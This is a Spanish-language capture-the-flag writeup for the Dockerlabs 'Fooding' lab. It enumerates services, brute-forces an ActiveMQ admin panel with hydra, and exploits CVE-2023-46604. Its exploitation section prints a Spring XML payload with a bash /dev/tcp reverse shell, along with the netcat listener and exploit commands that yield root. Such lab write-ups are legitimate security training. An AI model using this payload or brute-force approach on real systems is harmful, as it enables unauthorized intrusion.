
# Writeup Template: Maquina `[ Fooding ]`

- Tags: #Fooding #httpBasicAuth 
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Fooding](https://mega.nz/file/0SlG3S7Z#bF91meiTF3k8A9RGhvnqdS-Irm-GnDLYGpUQk1S9_lQ)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x fooding.zip
sudo bash auto_deploy.sh fooding.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,443,1883,5672,8161,42943,61613,61614,61616 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
443/tcp   open  ssl/http   Apache httpd 2.4.59 ((Debian))
1883/tcp  open  mqtt
5672/tcp  open  amqp?
8161/tcp  open  http       Jetty 9.4.39.v20210325
42943/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p80 172.17.0.2
```

Reporte:
```bash
/https/: Potentially interesting folder
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/https/               (Status: 200) [Size: 7219]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10701]
/https                (Status: 301) [Size: 308] [--> http://172.17.0.2/https/
```

Ahora si enumeramos la carpeta **https** con gobuster
```bash
gobuster dir -u http://172.17.0.2/https/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

Resultado:
```bash
/index.html           (Status: 200) [Size: 7219]
/assets               (Status: 301) [Size: 315] [--> http://172.17.0.2/https/assets/]
/README.txt           (Status: 200) [Size: 544]
/components.html      (Status: 200) [Size: 41079]
/LICENSE.txt          (Status: 200) [Size: 1063]
```

## Enumeracion de [Servicio Web HTTPS Principal]
```bash
http://172.17.0.2/https/
```

Fuzzeamos por directorios:
```bash
gobuster dir -u https://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py -k
```

Al realizar el reconocimiento, Tenemos lo mismo
```bash
/index.html           (Status: 200) [Size: 7219]
/assets               (Status: 301) [Size: 311] [--> https://172.17.0.2/assets/]
/README.txt           (Status: 200) [Size: 544]
/components.html      (Status: 200) [Size: 41079]
/LICENSE.txt          (Status: 200) [Size: 1063]
```

Si ingresamos al siguiente recurso solo obtenemos lo siguiente:
```bash
http://172.17.0.2:1883/

px
```

Y el la otra tenemos lo siguiente:
```bash
http://172.17.0.2:5672/

AMQP��AMQP����������SÀ¡�@p���`ÿ���`����SÀS�SÀM£amqp:decode-error¡7Connection from client using unsupported AMQP attempted
```

Ahora si ingresamos a al siguiente recurso:
```bash
172.17.0.2:8161
```

Tenemos un panel **HTTPBasicAuth**, Asi que realizaremos un ataque de fuerza bruta con **hydra**
Primero generamos un diicionario personalizado con el formato: **admin:admin**
```bash
cat /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt | xcp
cat /usr/share/SecLists/Passwords/Default-Credentials/avaya_defaultpasslist.txt | xcp
```

Con estos creamos un archivo con credenciales por defecto, Para ese tipo de panel **HTTBasicAuth**
**credentials.txt**, Ya que tenemos el diccionario usamos hydra para realizar el ataque de fuerza bruta:
```bash
hydra -C credentials.txt 172.17.0.2 -s 8161 http-get /
```

Tenemos las credenciales de autentificacion:
```bash
[DATA] attacking http-get://172.17.0.2:8161/
[8161][http-get] host: 172.17.0.2   login: admin   password: admin
```

Comenzamos la enumeracion de archivos:
```bash
gobuster dir -u http://172.17.0.2:8161/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py -U admin -P admin
```

Reporte:
```bash
===============================================================
/images               (Status: 302) [Size: 0] [--> http://172.17.0.2:8161/images/]
/index.html           (Status: 200) [Size: 6047]
/admin                (Status: 302) [Size: 0] [--> http://172.17.0.2:8161/admin/]
/api                  (Status: 302) [Size: 0] [--> http://172.17.0.2:8161/api/]
/styles               (Status: 302) [Size: 0] [--> http://172.17.0.2:8161/styles/]
```

Ahora procedemos a enumerar las tecnologias que corren detras de esta web:
**--user** para indicar el usuario y contrasena en el **HTTPBasicAuth**
```bash
whatweb http://172.17.0.2:8161/ --user=admin:admin
```

Nos reporta las tecnologias:
```bash
http://172.17.0.2:8161/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.39.v20210325)], IP[172.17.0.2], Jetty[9.4.39.v20210325], RedirectLocation[http://172.17.0.2:8161/index.html], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]

http://172.17.0.2:8161/index.html [200 OK] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.39.v20210325)], IP[172.17.0.2], Jetty[9.4.39.v20210325], Title[Apache ActiveMQ], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

Desde aqui si que podemos ver la version:
```bash
http://172.17.0.2:8161/admin/
```

```bash
|Name|**localhost**|
|Version|**5.15.15**|
|ID|**ID:52f59c06b8ec-39523-1751830194762-0:1**|
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora buscaremos en internte un exploit para esta version:
[Exploit](https://github.com/NKeshawarz/CVE-2023-46604-RCE) Tenemos este explit desde internet que podemos usar para ejecutar comandos:
```bash
git clone https://github.com/NKeshawarz/CVE-2023-46604-RCE --depth=1
```

Ahora tendremos la siguiente carpeta: **CVE-2023-46604-RCE**, Cuando ingresamos tendremos que modificar el archivo **poc.xml** para alli inyectar el comando que queremos que se ejecute:
```bash
File: poc.xml
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>open</value>
                <value>-a</value>
                <value>calculator</value>
                <!-- <value>bash</value> # Comando inyectado
                <value>-c</value> # Comando inyectado
                <value>touch /tmp/success</value> --> # Comando inyectado
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Ahora quedaria asi:
```bash
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/172.17.0.1/443 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```
### Ejecucion del Ataque
Primero nos ponemos en escucha en nuestra maquina atacante para recibir la conexion
```bash
# Comandos para explotación
nc -nlvp 443
```

Ahora montamos un servidor con python3 para que ese accesible el archivo **poc.xml** malicioso desde nuestra maquina atacante
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ejecutamos el exploit
```bash
# Reverse shell o acceso inicial
python3 CVE-2023-46604-RCE.py -i 172.17.0.2 -p 61616 -u http://172.17.0.1/poc.xml
Python implementation of Apache ActiveMQ Unauthenticated Remote Code Execution 
CVE: CVE-2023-46604
Coded by N.Keshawarz (https://github.com/NKeshawarz)
```

---
## Evidencia de Compromiso
Para esta maquina no tuvimos que realizar escalada ya que el servicio lo estaba ejeuctando el usuario **root** por lo tanto ganamos acceso con privilegos elevados:
```bash
# Captura de pantalla o output final
root@52f59c06b8ec:/# whoami                                                                                                                                                                                                                                                   
whoami      
root 
```